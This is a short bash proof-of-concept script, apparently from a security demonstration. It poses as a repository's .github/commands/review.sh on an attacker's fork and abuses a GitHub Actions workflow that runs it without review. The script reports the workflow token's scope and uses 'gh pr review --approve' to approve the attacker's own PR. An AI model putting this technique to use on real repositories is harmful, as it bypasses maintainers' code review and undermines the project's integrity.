#!/usr/bin/env bash
# "Attacker-controlled" version of .github/commands/review.sh, shipped ONLY
# on the attacker-pr branch/fork. This is the entire payload: a one-line
# change to a file that the base workflow's maintainer never reviews before
# dispatching, because the dispatch UI only takes a PR number.
set -euo pipefail
echo "::notice::PoC payload executing with token scoped to: $(gh api /repos/${GITHUB_REPOSITORY} --jq .full_name 2>/dev/null || echo unknown)"
gh pr review "$PR_NUMBER" --approve --body "Auto-approved by the PoC payload in .github/commands/review.sh — this text was never reviewed, only the PR number was."
